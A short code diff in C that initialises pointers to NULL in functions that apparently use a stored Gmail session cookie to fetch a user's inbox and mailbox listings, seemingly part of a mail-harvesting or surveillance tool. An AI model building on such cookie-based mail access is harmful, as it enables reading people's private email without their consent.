@@ -126,9 +126,9 @@ DWORD GMailGetIK(LPSTR strCookie, LPSTR *strIKValue, LPWSTR *strCurrentUserName)
 	*strIKValue = NULL;
 	*strCurrentUserName = NULL;
 
-	LPWSTR strURI;
-	LPSTR strRecvBuffer;
-	DWORD dwRet, dwBufferSize;
+	LPWSTR strURI = NULL;
+	LPSTR  strRecvBuffer = NULL;
+	DWORD  dwRet, dwBufferSize;
 
 	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
 	_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/?shva=1#%s", L"inbox"); // FIXME ARRAY
@@ -180,9 +180,9 @@ DWORD GMailContactHandler(LPSTR strCookie)
 
 DWORD GMailParseMailBox(LPWSTR strMailBoxName, LPSTR strCookie, LPSTR strIKValue, DWORD dwLastTSHigh, DWORD dwLastTS, BOOL bIncoming, BOOL bDraft)
 {
-	LPWSTR strURI;
-	LPSTR strRecvBuffer;
-	DWORD dwRet, dwBufferSize;
+	LPWSTR strURI = NULL;
+	LPSTR  strRecvBuffer = NULL;
+	DWORD  dwRet, dwBufferSize;
 
 	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
 	_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/?ui=2&ik=%S&view=tl&start=0&num=70&rt=c&search=%s", strIKValue, strMailBoxName); // FIXME ARRAY
